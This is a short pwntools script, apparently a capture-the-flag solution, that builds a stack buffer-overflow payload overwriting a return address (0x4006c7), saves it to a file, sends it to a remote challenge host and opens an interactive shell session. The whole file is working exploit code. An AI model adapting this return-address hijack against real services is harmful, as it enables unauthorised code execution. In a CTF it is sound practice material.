from pwn import * 
import struct

qq =  b"A" * 0x10 + b"BBBBBBBB" + struct.pack("<Q", 0x00000000004006c7) #+ b"/bin/sh"

with open("payload.txt", 'wb') as f: f.write(qq)
print(qq)
context(arch = 'i386', os = 'linux')
#r = process('./hello')
r = remote('ctf.adl.tw', 11001)
# EXPLOIT CODE GOES HERE
r.send(qq)
r.recv()
r.interactive()
